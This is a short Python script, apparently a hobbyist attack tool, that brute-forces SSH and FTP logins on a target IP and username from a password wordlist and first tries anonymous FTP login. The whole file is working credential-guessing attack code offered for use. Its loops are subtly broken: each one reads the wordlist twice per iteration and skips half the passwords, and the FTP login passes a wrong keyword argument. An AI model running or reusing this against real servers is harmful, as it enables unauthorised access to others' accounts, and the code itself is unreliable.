# password .txt file come from @duyet on github

import paramiko # pip install
import requests
import ftplib



def ssh_bruteforce():
    fich = open("passwords.txt")
    username = input("What is the targeted username ?")
    ip_target = input("What is the targeted IP ?")
    print("Bruteforcing ...")
    for ligne in fich:
        password = fich.readline()
        try :
            ssh=paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip_target,port=22,username=username,password=password,timeout=3)
            print(f"Succesfull login for {username} : {password}")
            ssh.close()
        except Exception :
            pass

    print("SSH Bruteforce failed")




def check_anonymous_login(ip_target):
    print("Checking for anonymous logins ...")
    try :
        ftp = ftplib.FTP(ip_target)
        ftp.login()
        print("Anonymous login succesfull")
        print(f"Welcome Message : {ftp.getwelcome()}")
        ftp.quit()
        return True
    except Exception as e:
        print(f"Anonymous login failed {e}")
        return False
        
def ftp_bruteforcce(username,ip_target):
    fich = open("passwords.txt")
    print("Bruteforcing ...")
    for ligne in fich:
        password = fich.readline()
        try :
            ftp = ftplib.FTP(ip_target)
            ftp.login(username=username,passwd=password)
            print("FTP login succesfull")
            ftp.quit() 
            return True
        except ftplib.error_perm :
            print("failed login")
        except Exception as e:
            print(f"Error {e}")
    print("Bruteforce attack failed")
    return False


    

def ftp_global():
    username = input("What is the targeted username ?")
    ip = input("What is the targeted IP ?")
    #start with anonymous login 
    if not check_anonymous_login(ip):
        #try bruteforce
        ftp_bruteforcce(username,ip)


ftp_global()
            